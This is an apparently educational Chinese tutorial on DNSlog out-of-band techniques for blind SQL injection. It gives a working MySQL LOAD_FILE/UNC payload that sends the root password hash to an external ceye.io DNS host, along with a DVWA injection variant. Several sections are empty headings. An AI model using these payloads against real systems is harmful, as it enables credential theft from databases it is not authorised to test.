<!-- TOC -->

- [前言](#前言)
- [DNSlog技术说明](#dnslog技术说明)
- [利用该技术的场景](#利用该技术的场景)
- [技术原理](#技术原理)
- [利用细节](#利用细节)
    - [SQL注入](#sql注入)
        - [MySQL](#mysql)
        - [SQL Server](#sql-server)
        - [Oracle](#oracle)
        - [PostgreSQL](#postgresql)
    - [命令执行](#命令执行)
    - [SSRF](#ssrf)
    - [XSS](#xss)
- [DNSlog平台的搭建](#dnslog平台的搭建)
- [参考](#参考)

<!-- /TOC -->
## 前言
&emsp;我们在测试盲注的时候，发现速度非常慢，那这个时候，爱思考的人就想到了利用DNS来突破这个限制，准确来说是利用DNS的log功能。

## DNSlog技术说明
&emsp;DNSlog注入属于带外通信的一种，英文：Out of Band，简称：OOB。我们之前的注入都是在同一个信道上面的，比如我们之前的联合查询注入，都是做HTTP请求，然后得到HTTP返回包，没有涉及到其他的信道，比如DNS。而带外通信，至少是要涉及到两个信道的。信道：在计算机中，指通信的通道，是信号传输的媒介。


## 利用该技术的场景
&emsp;每项技术都有其利用场景，并非万能的，而DNS log注入技术也是，我们在进行SQL盲注、命令执行、SSRF及XSS等攻击而无法看到回显结果时，就会用到该技术。

## 技术原理
![](https://p4.ssl.qhimg.com/t01a278167ad3a008db.jpg)

如图所示，作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。

简单说就是：DNSLog 用于监测 DNS 和 HTTP 访问记录，可通过HTTP请求，让目标主机主动请求 DNSLog API 地址，有相应的解析记录，则可判定为存在相应的漏洞。

## 利用细节
### SQL注入
#### MySQL
    * 支持load_file()函数（高版本默认不支持）
    * 开启allow_url_fopen（默认开启）

主体语句：`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM user WHERE user='root' LIMIT 1),'.b182oj.ceye.io\\abc'));`

dvwa实战语句：`'and SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM user WHERE user='root' LIMIT 1),'.b182oj.ceye.io\\abc')) AnD '1'='1`


**UNC路径**

以下是百度的UNC路径的解释
>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。

其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式`\\sss.xxx\test\`

这也就解释了为什么CONCAT()函数拼接了4个\了，因为转义的原因，4个就变\成了2个\，目的就是利用UNC路径。

**因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据**

#### SQL Server

#### Oracle

#### PostgreSQL

### 命令执行

### SSRF

### XSS

## DNSlog平台的搭建
&emsp;在我们实际的渗透中，我们不想使用一些别人家搭建的DNSlog平台，比较还是有可能被记录在别人的服务器上面的，这就涉及到保密的问题，那么就需要有自己可控的DNSlog平台。
&emsp;这里推荐BugScanTeam的 https://github.com/BugScanTeam/DNSLog ，该项目主页是有搭建教程的，按自己的需求搭建。


## 参考
[dnslog利用](http://byd.dropsec.xyz/2016/12/04/dnslog%E5%88%A9%E7%94%A8/)

[Dnslog在SQL注入中的实战](https://www.anquanke.com/post/id/98096)

[突破延迟注入和盲注速度限制，利用dns注入快速获取数据](https://phpinfo.me/2016/05/10/1210.html)

[sqlmap利用DNS进行oob(out of band)注入（转）](https://www.cnblogs.com/backlion/p/8984121.html)


[渗透技巧-mssql盲注与dnslog的完美结合(命令执行)](http://lawlietweb.com/2019/01/11/mssql%E7%9B%B2%E6%B3%A8%E4%B8%8Ednslog%E7%9A%84%E5%AE%8C%E7%BE%8E%E7%BB%93%E5%90%88(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/)

[HawkEye Log/Dns 在Sql注入中的应用](http://docs.hackinglab.cn/HawkEye-Log-Dns-Sqli.html)